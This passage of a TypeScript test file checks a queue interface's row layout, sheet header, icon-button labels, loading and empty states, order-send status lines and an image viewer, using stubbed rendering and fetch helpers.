    { name: "a copy not received adds the amber badge", item: answered("unacked", { canResend: true }), facts: [{ text: "Answer R1" }, { text: "Not received", badge: "warn" }] },
  ];
  for (const row of rows) test(row.name, () => assert.deepEqual(call("getRowFactsQ", { item: row.item, copies: [row.item] }, false), row.facts));

  test("an order to several sessions all still waiting says Not yet as a word, not a pill", () => {
    const copies = ["answered", "delivering"].map((status, index) => buildItem({ id: 90 + index, kind: "message", status, sendId: "send-1", answeredAt: "2026-11-12T12:26:40.118Z" }));
    assert.deepEqual(call("getRowFactsQ", { item: copies[0], copies }, false), [{ text: "Order" }, { text: "Not yet" }]);
  });

  // spec §4.2: who, then what — the name in its own column ahead of the title, the meta line under the title holding the facts alone
  test("a row's session name stands in its own column before the title, and its meta line holds only its facts, ` · ` between them", () => {
    const view = { isNameShown: true, isAccountShown: true, tabStopId: 41 };
    const tree = render("QueueRowQ", { row: call("getSingleRowQ", buildItem({ session: buildSession({ name: "gersona" }) })), isSelected: false, view, onSelect: () => undefined, onOrder: () => undefined });
    const [option] = findNodes(tree, (node) => node.props?.role === "option");
    const slots = (option?.children ?? []).flatMap((child) => (typeof child === "object" && child !== null ? [String((child as RenderedNode).props?.className ?? "")] : []));
    const [who] = byClass(tree, "queue-row-who");
    const [meta] = byClass(tree, "queue-row-meta");
    assert.deepEqual([slots.slice(0, 3), collectText(who as RenderedNode)], [["queue-row-who", "queue-row-title", "queue-row-meta"], "gersona"]);
    assert.match(collectText(meta as RenderedNode).replace(/\s+/g, " ").trim(), /^work-dev · 2 options \d/);
  });

  test("with exactly one session ticked a row paints no name column", () => {
    const view = { isNameShown: false, isAccountShown: false, tabStopId: 41 };
    const tree = render("QueueRowQ", { row: call("getSingleRowQ", buildItem({ session: buildSession({ name: "gersona" }) })), isSelected: false, view, onSelect: () => undefined, onOrder: () => undefined });
    assert.deepEqual([byClass(tree, "queue-row-who").length, collectText(tree).includes("gersona")], [0, false]);
  });

  // spec §4.4: an arrival carries no mark of its own — no badge on its face, no New in its name
  test("an arrived row paints no badge and its name has no New", () => {
    const view = { isNameShown: true, isAccountShown: false, tabStopId: 41 };
    const tree = render("QueueRowQ", { row: call("getSingleRowQ", buildItem({ kind: "report" })), isSelected: false, isNew: true, view, onSelect: () => undefined, onOrder: () => undefined, onSeen: () => undefined });
    const [option] = findNodes(tree, (node) => node.props?.role === "option");
    assert.deepEqual([findNodes(tree, (node) => node.props?.atom === "Badge").length, /\bNew\b/.test(String(option?.props["aria-label"]))], [0, false]);
  });

  // spec §4.2: a name the session did not register is its start directory's, said under it; one name stands for one session alone
  const whoRows = [
    { name: "an unregistered name of one session says start directory under it", session: { name: "atrium-hooks", isNameRegistered: false }, copies: 1, lines: ["atrium-hooks", "start directory"] },
    { name: "a registered name stands alone", session: { name: "gersona", isNameRegistered: true }, copies: 1, lines: ["gersona"] },
    { name: "an order to several sessions names their count, never a directory", session: { name: "atrium-hooks", isNameRegistered: false }, copies: 2, lines: ["2 sessions"] },
  ];
  for (const row of whoRows) {
    test(`row name column: ${row.name}`, () => {
      const item = buildItem({ kind: "message", sendId: "send-1", session: buildSession(row.session) });
      const copies = Array.from({ length: row.copies }, (_, index) => ({ ...item, id: item.id + index }));
      const tree = render("RowWhoQ", { row: { id: item.id, item, copies } });
      assert.deepEqual(findNodes(tree, (node) => typeof node.props?.className === "string" && /^queue-row-(name|dir)$/.test(node.props.className)).map((node) => collectText(node)), row.lines);
    });
  }
});

describe("the sheet's letterhead and record", () => {
  const item = buildItem({ status: "unacked", canResend: true, answer: { code: "R1" }, answeredAt: "2026-11-12T12:26:40.118Z", answerRecord: { route: "answer", signal: "fetch_metadata" }, session: buildSession({ name: "aidl", state: "live" }) });

  test("an answered decision's date line holds the receipt badge alone", () => {
    const facts = findNodes(render("LetterheadFactsQ", { item }), (node) => node.props?.atom === "Badge").map((node) => collectText(node));
    assert.deepEqual([facts, collectText(render("LetterheadFactsQ", { item })).includes("Answer R1")], [["Not received"], false]);
  });

  test("the date line's time reads the spec's dated form and its title carries the answer record", () => {
    const tree = render("LetterheadTimeQ", { item });
    const [time] = findNodes(tree, (node) => typeof node.props?.title === "string");
    assert.equal(time?.props.title, "Answered 2026-11-12 21:26 KST through the monitor (same-origin request)");
    assert.ok(collectText(tree).endsWith("2026-11-12 21:26 KST"), collectText(tree));
  });

  test("the sheet's date line comes first in its body: the facts, then the time", () => {
    const tree = renderSheet({ item, queue: buildQueue().queue });
    const [line] = byClass(tree, "queue-date-line");
    const [body] = byClass(tree, "queue-sheet-body");
    assert.deepEqual([body?.children[0] === line, collectText(line as RenderedNode).replace(/\s+/g, " ").trim()], [true, "Not received Answered 2026-11-12 21:26 KST"]);
  });

  test("the sheet's head holds the way back, the kind tag and name as its h2, the position and the stepping", () => {
    const { calls, queue } = buildQueue({ steps: { index: 0, count: 8, prevId: null, nextId: 7 } });
    const tree = renderSheet({ item: buildItem(), queue });
    const [head] = byClass(tree, "card-head");
    const buttons = findNodes(head as RenderedNode, (node) => node.type === "button");
    for (const button of buttons) if (!button.props.disabled) (button.props.onClick as () => void)();
    assert.deepEqual(buttons.map((button) => [button.props["aria-label"], button.props.title, Boolean(button.props.disabled)]), [["Back to the list", "Back to the list (Esc)", false], ["Previous item", "Previous item (K)", true], ["Next item", "Next item (J)", false]]);
    assert.equal(collectText(findNodes(head as RenderedNode, (node) => node.type === "h2")[0] as RenderedNode).replace(/\s+/g, " ").trim(), "Decision from glass-atrium");
    assert.ok(collectText(head as RenderedNode).includes("1 of 8"));
    assert.deepEqual(getPlain(calls), [["back"], ["selectRow", 7]]);
  });

  // the count rides the back control's name; its painted badge stands beside the glyph-only square, hidden from the name's reader
  test("rows that arrived while the sheet is open are counted on the way back, in its name and in a badge beside it", () => {
    const { queue } = buildQueue({ list: { status: "ready", data: { items: [], nextCursor: null }, newIds: [50, 51] } });
    const [head] = byClass(renderSheet({ item: buildItem(), queue }), "card-head");
    const [back] = findNodes(head as RenderedNode, (node) => node.type === "button" && /^Back to the list/.test(String(node.props["aria-label"])));
    const hidden = findNodes(head as RenderedNode, (node) => node.props?.["aria-hidden"] === "true" && findNodes(node, (child) => child.props?.atom === "Badge").length > 0);
    assert.deepEqual(
      [back?.props["aria-label"], findNodes(back as RenderedNode, (node) => node.props?.atom === "Badge").length, hidden.map((node) => collectText(node))],
      ["Back to the list, 2 new in the list", 0, ["2"]],
    );
  });

  // spec §12.5: a glyph-only control → no text on its face, one glyph, the act in its name, the name and its key in its tooltip
  const iconControls = [
    { name: "the way back", tree: () => renderSheet({ item: buildItem(), queue: buildQueue().queue }), label: "Back to the list", glyph: "arrow-left", title: "Back to the list (Esc)" },
    { name: "the previous item", tree: () => renderSheet({ item: buildItem(), queue: buildQueue({ steps: { index: 1, count: 3, prevId: 5, nextId: 7 } }).queue }), label: "Previous item", glyph: "chevron-up", title: "Previous item (K)" },
    { name: "the next item", tree: () => renderSheet({ item: buildItem(), queue: buildQueue({ steps: { index: 1, count: 3, prevId: 5, nextId: 7 } }).queue }), label: "Next item", glyph: "chevron-down", title: "Next item (J)" },
    { name: "the viewer's previous image", tree: () => renderViewer(), label: "Previous image", glyph: "chevron-left", title: "Previous image (←)" },
    { name: "the viewer's next image", tree: () => renderViewer(), label: "Next image", glyph: "chevron-right", title: "Next image (→)" },
    { name: "the viewer's close", tree: () => renderViewer(), label: "Close", glyph: "x", title: "Close (Esc)" },
  ];
  for (const row of iconControls) {
    test(`${row.name} is a ghost icon button: one glyph, no text, named for its act, its tooltip the name and its key`, () => {
      const [button] = findNodes(row.tree(), (node) => node.type === "button" && node.props["aria-label"] === row.label);
      const classes = String(button?.props.className ?? "").split(" ");
      const glyphs = findNodes(button as RenderedNode, (node) => node.props?.atom === "Icon").map((node) => node.props.name);
      assert.deepEqual([classes.includes("ghost") && classes.includes("icon"), collectText(button as RenderedNode).trim(), glyphs, button?.props.title], [true, "", [row.glyph], row.title]);
    });
  }

  // spec §9.8 / §12.5: re-sending a file is a re-send → it keeps its word, the quiet tier, never a bare glyph
  test("a failed upload's Try again is a quiet word button: its word on its face and no glyph", () => {
    const tree = render("ImageFailureLineQ", { text: "shot-3.png could not be uploaded.", retryId: "box-retry", onRetry: () => undefined });
    const [button] = findNodes(tree, (node) => node.type === "button");
    const classes = String(button?.props.className ?? "").split(" ");
    assert.deepEqual([classes.includes("ghost"), classes.includes("icon"), collectText(button as RenderedNode).trim(), findNodes(button as RenderedNode, (node) => node.props?.atom === "Icon").length], [true, false, "Try again", 0]);
  });

  // the session's facts ride its name; the id or the account shows only while it tells two loaded sessions apart
  const twin = buildSession({ id: "b7c6d5e4-0000-4000-8000-000000000001" });
  const elsewhere = buildSession({ id: "c1d2e3f4-0000-4000-8000-000000000002", name: "aidl", profileLabel: ".claude-personal" });
  const nameRows = [
    { name: "a name no other loaded session carries stands alone", items: [buildItem()], expected: "glass-atrium" },
    { name: "a name two loaded sessions share takes the 8-character id", items: [buildItem(), buildItem({ id: 42, session: twin })], expected: "glass-atrium · 6f1c2a9e" },
    { name: "items from more than one account add the account", items: [buildItem(), buildItem({ id: 42, session: elsewhere })], expected: "glass-atrium · work-dev" },
  ];
  for (const row of nameRows) {
    test(`the sheet's session name: ${row.name}`, () => {
      const { queue } = buildQueue({ list: { status: "ready", data: { items: row.items, nextCursor: null }, newIds: [] } });
      const [name] = byClass(renderSheet({ item: row.items[0], queue }), "queue-letter-name");
      assert.equal(collectText(name as RenderedNode).replace(/\s+/g, " ").trim(), row.expected);
    });
  }

  test("the record is no visible line, and a not received answer says why and what to run", () => {
    const text = collectText(render("CardStateQ", { item, cliPath: CLI_PATH }));
    assert.ok(!text.includes("same-origin") && text.includes("aidl did not acknowledge it") && text.includes(`${CLI_PATH} pending`), text);
  });

  test("the folded question opens on the system chevron", () => {
    const [summary] = findNodes(render("OriginalQuestionQ", { item }), (node) => node.type === "summary");
    assert.ok(findNodes(summary as RenderedNode, (node) => node.props?.atom === "DisclosureChevron").length === 1);
  });
});

describe("loading and empty states", () => {
  test("each loading body names its source once and the list head counts nothing before the first read", () => {
    const { queue } = buildQueue();
    const loading = { ...withList(queue, []), list: { status: "loading", data: null, error: null, readAt: null, newIds: [] } };
    const [placeholder] = findNodes(render("ListBodyQ", { queue: loading, items: [], visible: [] }), (node) => node.props?.atom === "LoadingPlaceholder");
    const [card] = findNodes(render("QueueListQ", { queue: loading }), (node) => node.props?.atom === "Card");
    assert.deepEqual([placeholder?.props.label, card?.props.sub ?? null], ["the queue", null]);
  });

  test("an empty thread names the ticked sessions and asks for the first order", () => {
    const tree = render("ThreadEmptyQ", { names: ["aidl"] });
    const [empty] = findNodes(tree, (node) => node.props?.atom === "EmptyState");
    assert.deepEqual({ message: empty?.props.message, hint: empty?.props.hint }, { message: "No orders to aidl yet", hint: "Write the first one below." });
  });

  test("a refusal reason that ends its own sentence gets no second period", () => {
    assert.equal(call("getRefusalReasonQ", { status: 409, data: { reason: "aidl ended, send again." } }), "Refused: aidl ended, send again.");
  });
});

describe("Orders after a send", () => {
  test("a taken send's status line carries the quiet Show to its order, and the box takes the focus back", async () => {
    const focused: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub(), document: { getElementById: (id: string) => ({ focus: () => focused.push(id) }) } },
      fetch: async () => ({ status: 201, json: async () => ({ sendId: "send-7", items: [{ id: 77, sessionId: SESSION_ID }] }) }),
    })) as ScreenModule;
    const statuses: unknown[] = [];
    await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({ body: { sessionIds: [SESSION_ID], text: "go" }, names: ["yoaida"], setComposer: () => undefined, setStatus: (next: unknown) => statuses.push(next), onSent: () => undefined });
    assert.deepEqual([getPlain(statuses), focused], [[{ text: "✓ Order sent to yoaida", orderId: 77 }], ["queue-order-text"]]);
  });

  test("of the sheet's acts only a sent report's line names an order, the report itself, so its Show opens it", () => {
    const report = buildItem({ id: 61, kind: "report", session: buildSession({ name: "yoaida" }) });
    const lines = ["seen", "reply", "later"].map((action) => call("getActionStatusQ", report, action));
    assert.deepEqual(lines, ["Marked as read", { text: "✓ Order sent to yoaida", orderId: 61 }, "Moved to the end of Reports"]);
  });

  test("a recipient's Resend is an edged small button", () => {
    const tree = render("RecipientRowQ", { copy: buildItem({ kind: "message", status: "unacked", canResend: true }), onResend: () => undefined });
    assert.deepEqual(buttonLabelled(tree, "Resend").map((node) => node.props.className), ["btn sm"]);
  });

  test("the thumbnails' count leaves out an image that failed to upload", () => {
    const shots = [{ status: "stored", bytes: 2048 }, { status: "failed", bytes: 139 * 1024 }];
    assert.deepEqual([call("getImageCountLineQ", shots), call("getImageCountLineQ", [shots[1]])], ["1 image · 2 KB", ""]);
  });

  test("the viewer is one picture over one foot bar: name · size · place, previous / next and Close", () => {
    const steps: unknown[] = [];
    const tree = renderViewer((next: unknown) => steps.push(next));
    const [surface] = findNodes(tree, (node) => node.props?.atom === "DetailSurface");
    for (const label of ["Previous image", "Next image"]) for (const button of findNodes(tree, (node) => node.props?.["aria-label"] === label)) (button.props.onClick as () => void)();
    const closes = findNodes(tree, (node) => node.type === "button" && node.props["aria-label"] === "Close");
    assert.deepEqual([surface?.props.bare, surface?.props.footer ?? null, steps, closes.length, collectText(tree).split("shot-2.png").length - 1], [true, null, [0, 2], 1, 1]);
  });
});

function renderViewer(onStep: (next: unknown) => unknown = () => undefined): RenderedNode {
  const images = IMAGE_ID.map((id, index) => ({ id, name: `shot-${index + 1}.png`, bytes: 1024 * 1024, width: 800, height: 600 }));
  return render("ImageViewerQ", { images, index: 1, onStep, onClose: () => undefined });
}
